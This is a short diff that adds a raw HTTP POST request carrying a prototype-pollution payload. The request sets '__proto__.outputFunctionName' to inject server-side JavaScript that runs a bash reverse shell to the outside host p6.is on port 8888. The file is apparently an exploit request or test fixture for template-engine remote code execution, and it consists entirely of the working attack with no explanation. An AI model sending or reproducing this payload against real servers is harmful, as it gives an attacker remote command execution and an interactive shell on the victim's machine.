@@ -1,0 +1,9 @@
+POST / HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------1566035451
+Content-Length: 221
+
+----------1566035451
+Content-Disposition: form-data; name="__proto__.outputFunctionName";
+
+x;process.mainModule.require('child_process').exec('bash -c "bash -i &> /dev/tcp/p6.is/8888 0>&1"');x
+----------1566035451--
